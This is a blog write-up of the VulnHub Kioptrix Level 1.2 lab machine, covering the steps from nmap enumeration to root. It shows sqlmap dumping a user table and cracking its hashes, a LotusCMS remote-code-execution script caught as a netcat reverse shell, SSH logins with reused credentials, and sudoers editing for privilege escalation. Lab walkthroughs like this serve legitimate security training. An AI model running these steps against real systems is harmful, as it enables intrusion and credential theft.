<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8"/>
    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
    <meta name="description" content="Personal Weblog"/>
    <meta content="width=device-width, initial-scale=1" name="viewport"/>
    <title>‡§Æ‡§Ç‡§•‡§® | Manthan</title>
    <link rel="icon" type="image/webp" sizes="32x32" href="/static/images/manthan-32x32.png.webp"/>
    <link rel="stylesheet" type="text/css" media="screen" href="/static/css/style.css"/>
    <link rel="stylesheet" href="/static/css/atelier-forest-light.css">
    <!-- <link rel="stylesheet" href="/static/css/atom-one-light.min.css"> -->
    <!-- <link rel="stylesheet" href="/static/css/default.min.css"> -->
    <!-- <link rel="stylesheet" href="/static/css/docco.min.css"> -->
    <!-- <link rel="stylesheet" href="/static/css/github-gist.min.css"> -->
    <!-- <link rel="stylesheet" href="/static/css/github.min.css"> -->
    <!-- <link rel="stylesheet" href="/static/css/zenburn.min.css"> -->
    <script charset="UTF-8" src="/static/js/highlight.min.js"></script>
    <script charset="UTF-8" src="/static/js/highlightjs-line-numbers.min.js"></script>
    <script charset="UTF-8" src="/static/js/go.min.js"></script>
   </head>
  <body>
    <div class="body">
      <div class="topmenu">
        <table>
          <tr>
            <td colspan="3"><a class="menu_home" href="/index.html">‡§Æ‡§Ç‡§•‡§®</a></td>
          </tr>
          <tr>
            <td><a class="menu_archive" href="/archive.html">üíæ Archive</a></td>
            <td><a class="menu_tags" href="/tags.html">üîñ Tags</a></td>
            <td><a class="menu_stats" href="/stats.html">üìä Stats</a></td>
          </tr>
        </table>
      </div>
      <div class="content">
          <hr>
  <h1 class="h1 title collapsible" onclick="toggle(this);">[VulnHub] Kioptrix: Level 1.2 (#3)</h1>
    <div class="title"><code><span class="sparklines"><span style="color:#007bff;">‚ñá</span><span style="color:#fe4164;">‚ñÇ</span><span style="color:#28a745;">‚ñà</span><span style="color:#99cc99;">‚ñà</span><span style="color:#ffc107;">‚ñÇ</span><span style="color:#20b2aa;">‚ñÅ</span><span style="color:#6f42c1;">‚ñá</span><span style="color:#fd7e14;">‚ñÜ</span><span style="color:#6c757d;">‚ñÇ</span><span style="color:#0c9;">‚ñÖ</span><span style="color:#00b7eb;">‚ñÑ</span><span style="color:#ffcc66;">‚ñà</span><span style="color:#99cc99;">‚ñÇ</span><span style="color:#69359c;">‚ñÇ</span><span style="color:#20b2aa;">‚ñÅ</span><span style="color:#20c997;">‚ñÖ</span><span style="color:#fe4164;">‚ñÇ</span><span style="color:#0c9;">‚ñÜ</span><span style="color:#00bcd4;">‚ñÅ</span><span style="color:#6f42c1;">‚ñÜ</span><span style="color:#fe4164;">‚ñà</span><span style="color:#17a2b8;">‚ñÅ</span><span style="color:#6c757d;">‚ñÉ</span><span style="color:#6f42c1;">‚ñÅ</span><span style="color:#f44336;">‚ñÇ</span><span style="color:#fe4164;">‚ñÜ</span><span style="color:#28a745;">‚ñá</span><span style="color:#e83e8c;">‚ñÉ</span><span style="color:#28a745;">‚ñá</span><span style="color:#0c9;">‚ñá</span><span style="color:#17a2b8;">‚ñÖ</span><span style="color:#99cc99;">‚ñÇ</span><span style="color:#0c9;">‚ñÇ</span><span style="color:#17a2b8;">‚ñÜ</span><span style="color:#17a2b8;">‚ñÅ</span><span style="color:#ffc107;">‚ñá</span><span style="color:#6c757d;">‚ñà</span><span style="color:#17a2b8;">‚ñÅ</span><span style="color:#fd7e14;">‚ñÅ</span><span style="color:#ffc107;">‚ñÑ</span><span style="color:#6f42c1;">‚ñÅ</span><span style="color:#ffcc66;">‚ñá</span><span style="color:#20c997;">‚ñÑ</span><span style="color:#17a2b8;">‚ñÑ</span><span style="color:#99cc99;">‚ñÉ</span><span style="color:#6f42c1;">‚ñÇ</span><span style="color:#0c9;">‚ñÖ</span><span style="color:#ffcc66;">‚ñÖ</span><span style="color:#6610f2;">‚ñá</span><span style="color:#2196f3;">‚ñà</span><span style="color:#00b7eb;">‚ñá</span><span style="color:#4caf50;">‚ñÑ</span><span style="color:#99cc99;">‚ñÜ</span><span style="color:#0c9;">‚ñà</span><span style="color:#28a745;">‚ñá</span><span style="color:#ffcc66;">‚ñÑ</span><span style="color:#fd7e14;">‚ñÖ</span><span style="color:#007bff;">‚ñá</span><span style="color:#20b2aa;">‚ñÜ</span><span style="color:#2196f3;">‚ñÑ</span><span style="color:#ffcc66;">‚ñÇ</span><span style="color:#f44336;">‚ñÜ</span><span style="color:#dc3545;">‚ñÜ</span><span style="color:#a50b5e;">‚ñÉ</span></span></code></div>
    <hr>
          <p style="float:left;"><a href="/posts/20190928_vulnhub-kioptrix2.html"> ¬´ </a>üìÖ published on <code>29/Sep/2019</code><a href="/posts/20191008_vulnhub-kioptrix4.html"> ¬ª </a></p>
        <p style="float:right;">üîñ tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a></p>
    <div style="clear:both;"></div>
    <hr><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
<p class="nested active">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">Kioptrix: Level 1.2 (#3)</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
<p class="nested active"><img alt="writeup.overview.machinescli" src="/static/files/posts_vulnhub_kioptrix3/machinescli.png.webp" /></p>
<h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
<p class="nested active">Here's the killchain (<code>enumeration</code> ‚Üí <code>exploitation</code> ‚Üí <code>privilege escalation</code>) for this machine:</p>
<p class="nested active"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_kioptrix3/killchain.png.webp" /></p>
<h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
<p class="nested active">1. <code>80/tcp/http/Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)</code>: <a href="https://github.com/7h3rAm/writeups#exploit_lotuscms">exploit_lotuscms</a>, <a href="https://github.com/7h3rAm/writeups#privesc_sudoers">privesc_sudoers</a>, <a href="https://github.com/7h3rAm/writeups#privesc_sudo">privesc_sudo</a>  </p>
<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
<p class="nested active">1. Here's the Nmap scan result:  </p>
<pre class="nested active"><code># Nmap 7.70 scan initiated Sat Sep 28 20:47:08 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.kioptrix3/results/192.168.92.184/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.kioptrix3/results/192.168.92.184/scans/xml/_quick_tcp_nmap.xml 192.168.92.184
Nmap scan report for 192.168.92.184
Host is up, received arp-response (0.00090s latency).
Scanned at 2019-09-28 20:47:09 PDT for 9s
Not shown: 998 closed ports
Reason: 998 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey:
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAL4CpDFXD9Zn2ONktcyGQL37Dn6s9JaOv3oKjxfdiABm9GjRkLEtbSAK3vhBBUJTZcVKYZk21lFHAqoe/+pLr4U9yOLOBbSoKNSxQ2VHN9FOLc9C58hKMF/0sjDsSIZnaI4zO7M4HmdEMYXONrmj2x6qczbfqecs+z4cEYVUF3R3AAAAFQCuG9mm7mLm1GGqZRSICZ+omMZkKQAAAIEAnj8NDH48hL+Pp06GWQZOlhte8JRZT5do6n8+bCgRSOvaYLYGoNi/GBzlET6tMSjWMsyhVY/YKTNTXRjqzS1DqbODM7M1GzLjsmGtVlkLoQafV6HJ25JsKPCEzSImjeOCpzwRP5opjmMrYBMjjKqtIlWYpaUijT4uR08tdaTxCukAAACBAJeJ9j2DTugDAy+SLCa0dZCH+jnclNo3o6oINF1FjzICdgDONL2YbBeU3CiAL2BureorAE0lturvvrIC2xVn2vHhrLpz6NPbDAkrLV2/rwoavbCkYGrwXdBHd5ObqBIkoUKbI1hGIGA51nafI2tjoXPfIeHeNOep20hgr32x9x1x
|   2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAyOv6c+5ON+N+ZNDtjetiZ0eUxnIR1U0UqSF+a24Pz2xqdnJC1EN0O3zxGJB3gfPdJlyqUDiozbEth1GBP//8wbWsa1pLJOL1YmcumEJCsitngnrVN7huACG127UjKP8hArECjCHzc1P372gN3AQ/h5aZd0VV17e03HnAJ64ZziOQzVJ+DKWJbiHoXC2cdD1P+nlhK5fULe0QBvmA14gkl2LWA6KILHiisHZpF+V3X7NvXYyCSSI9GeXwhW4RKOCGdGVbjYf7d93K9gj0oU7dHrbdNKgX0WosuhMuXmKleHkIxfyLAILYWrRRj0GVdhZfbI99J3TYaR/yLTpb0D6mhw==
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: 99EFC00391F142252888403BB1C196D2
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Ligoat Security - Got Goat? Security ...
MAC Address: 00:0C:29:3F:EF:00 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 28 20:47:18 2019 -- 1 IP address (1 host up) scanned in 10.35 seconds
</code></pre>
<p class="nested active">2. Here a summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:</p>
<p class="nested active"><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_vulnhub_kioptrix3/openports.png.webp" />  </p>
<p class="nested active">3. We added an entry for this target within <code>/etc/hosts</code> file:  </p>
<pre class="nested active"><code>tail -2 /etc/hosts
  192.168.92.184  kioptrix3.com
</code></pre>
<p class="nested active"><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_vulnhub_kioptrix3/screenshot00.png.webp" />  </p>
<p class="nested active">4. We find a login page at the following url: <code>http://kioptrix3.com/index.php?system=Admin</code>  </p>
<p class="nested active"><img alt="writeup.enumeration.steps.4.1" src="/static/files/posts_vulnhub_kioptrix3/screenshot01.png.webp" />  </p>
<p class="nested active">5. We find that the underlying CMS is <code>LotusCMS</code> and use searchsploit to look for any exploits. There were two hits but nothing useful as using Metasploit is out of scope for this writeup. We decided to look for non-MSF versions of the remote code execution exploit for <code>LotusCMS</code>:  </p>
<pre class="nested active"><code>searchsploit lotuscms
</code></pre>
<p class="nested active"><img alt="writeup.enumeration.steps.5.1" src="/static/files/posts_vulnhub_kioptrix3/screenshot02.png.webp" />  </p>
<p class="nested active">6. We also find a gallery application hosted on the following url: <code>http://kioptrix3.com/gallery/</code>. We test this application for SQLi using <code>sqlmap</code> and are able to dump the <code>dev_accounts</code> table from the <code>gallery</code> database. This table lists unsalted MD5 hashes for users <code>dreg</code> and <code>loneferret</code> that are auto-cracked by <code>sqlmap</code>:  </p>
<pre class="nested active"><code>sqlmap --batch -u &quot;http://kioptrix3.com/gallery/gallery.php?id=null&quot; --dump
  Database: gallery
  Table: dev_accounts
  [2 entries]
  +----+------------+---------------------------------------------+
  | id | username   | password                                    |
  +----+------------+---------------------------------------------+
  | 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   |
  | 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e (starwars) |
  +----+------------+---------------------------------------------+
</code></pre>
<p class="nested active"><img alt="writeup.enumeration.steps.6.1" src="/static/files/posts_vulnhub_kioptrix3/screenshot03.png.webp" />  </p>
<p class="nested active"><img alt="writeup.enumeration.steps.6.2" src="/static/files/posts_vulnhub_kioptrix3/screenshot04.png.webp" />  </p>
<h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
<h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
<pre class="nested active"><code>22/tcp  |  ssh   |  OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp  |  http  |  Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
</code></pre>
<h4 class="h4 collapsible" onclick="toggle(this);">Users</h4>
<pre class="nested active"><code>lotuscms: dreg, loneferret
</code></pre>
<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
<p class="nested active">1. We find a remote code execution <a href="https://github.com/Hood3dRob1n/LotusCMS-Exploit">exploit on GitHub</a> for <code>LotusCMS</code> and decide to use it. This exploit gives us a reverse shell that we can catch using <code>netcat</code>:  </p>
<pre class="nested active"><code>nc -nlvp 443
./lotusRCE.sh kioptrix3.com
</code></pre>
<p class="nested active"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_kioptrix3/screenshot05a.png.webp" />  </p>
<p class="nested active"><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_kioptrix3/screenshot05b.png.webp" />  </p>
<p class="nested active">2. We can also <code>ssh</code> as users <code>dreg</code> or <code>loneferret</code> into the target system using the credentials we dumped from the <code>LotusCMS</code> database. This is possible because these users have reused their CMS credentials for local system access:  </p>
<pre class="nested active"><code>ssh dreg@192.168.92.184
ssh loneferret@192.168.92.184
</code></pre>
<p class="nested active"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_kioptrix3/screenshot06.png.webp" />  </p>
<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
<pre class="nested active"><code>loneferret@Kioptrix3&gt; id
uid=1000(loneferret) gid=100(users) groups=100(users)
loneferret@Kioptrix3&gt;  
loneferret@Kioptrix3&gt; uname
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux
loneferret@Kioptrix3&gt;  
loneferret@Kioptrix3&gt; ifconfig
eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000
      link/ether 00:0c:29:3f:ef:00 brd ff:ff:ff:ff:ff:ff
      inet 192.168.92.184/24 brd 192.168.92.255 scope global eth1
      inet6 fe80::20c:29ff:fe3f:ef00/64 scope link
         valid_lft forever preferred_lft forever
loneferret@Kioptrix3&gt;  
loneferret@Kioptrix3&gt; users
root
loneferret
dreg
</code></pre>
<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
<p class="nested active">1. We continue as user <code>loneferret</code> since this user has an interesting <code>sudo</code> entry:  </p>
<pre class="nested active"><code>sudo -l
  User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht
</code></pre>
<p class="nested active"><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_kioptrix3/screenshot07.png.webp" />  </p>
<p class="nested active">2. We find that the user <code>loneferret</code> can run the <code>ht</code> editor with <code>sudo</code> privileges and as such can modify any system file. We decide to open the <code>/etc/sudoers</code> file and edit the entry for user <code>loneferret</code> and give this user unrestricted <code>sudo</code> access:  </p>
<pre class="nested active"><code>sudo ht
  /etc/sudoers
    loneferret ALL=(ALL) ALL
</code></pre>
<p class="nested active"><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_kioptrix3/screenshot08.png.webp" />  </p>
<p class="nested active">3. Once the above changeas are done, we can now switch to <code>root</code> to complete the challenge:  </p>
<pre class="nested active"><code>sudo su
</code></pre>
<p class="nested active"><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_kioptrix3/screenshot09.png.webp" />  </p>
<p class="nested active"><img alt="writeup.privesc.steps.3.2" src="/static/files/posts_vulnhub_kioptrix3/screenshot10.png.webp" />  </p>
<hr><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
<h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
<pre class="nested active"><code>root:$1$QAKvVJey$6rRkAMGKq1u62yfDaenUr1:15082:............
loneferret:$1$qbkHf53U$r.kK/JgDLDcXGRC6xUfB11:15079.............
dreg:$1$qAc2saWZ$Y567sEs.ql3GMttI6pvoe0:15080:............
</code></pre>
<h3 class="h3 collapsible" onclick="toggle(this);">Credentials</h3>
<pre class="nested active"><code>lotuscms: dreg/Mas..., loneferret/star....
mysql: root/fucke...
ssh: dreg/Mas..., loneferret/star....
</code></pre>
<hr><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
<ul class="nested active">
<li><a href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">https://www.vulnhub.com/entry/kioptrix-level-12-3,24/</a>  </li>
<li><a href="https://v3ded.github.io/ctf/kioptrix3.html">https://v3ded.github.io/ctf/kioptrix3.html</a>  </li>
<li><a href="https://www.abatchy.com/2016/12/kioptrix-3-walkthrough-vulnhub">https://www.abatchy.com/2016/12/kioptrix-3-walkthrough-vulnhub</a>  </li>
</ul>
    <hr>
          <p style="float:left;">¬´ <a href="/posts/20190928_vulnhub-kioptrix2.html">[VulnHub] Kioptrix: Level 1.1 ...</a> ¬´</p>
      <p style="float:right;">¬ª <a href="/posts/20191008_vulnhub-kioptrix4.html">[VulnHub] Kioptrix: Level 1.3 ...</a> ¬ª</p>
          </div>
      <div><a class="footer" href="https://github.com/7h3rAm/7h3rAm.github.io">Óäë Óäê Óäó</a></div>
      <script>hljs.initHighlightingOnLoad();</script>
      <script>hljs.initLineNumbersOnLoad();</script>
      <script>
        function toggle(s){
          s.classList.toggle("expanded");
          var t=!1,i=!1,a=!1;
          s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0);
          for(var l=s.nextElementSibling;l;){
            if(t&&l.classList.contains("h2")){
              l.classList.toggle("active");
              break
            }
            if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){
              l.classList.toggle("active");
              break
            }
            if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){
              l.classList.toggle("active");
              break
            }
            l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling
          }
        }
      </script>
    </div>
  </body>
</html>